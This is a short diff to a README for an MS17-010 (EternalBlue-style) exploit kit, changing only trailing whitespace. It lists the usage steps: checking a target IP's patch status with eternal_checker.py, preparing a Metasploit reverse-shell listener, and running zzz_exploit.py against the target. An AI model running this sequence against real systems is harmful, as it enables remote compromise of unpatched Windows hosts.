@@ -1,6 +1,6 @@
 # MS17-010 Exploit Code
 
-调用过程：
+调用过程：   
 python eternal_checker.py target_ip 补丁情况 The target is not patched   
 ./listener_prep.sh 配置msf的反弹shell   
 python zzz_exploit.py target_ip exploit利用   
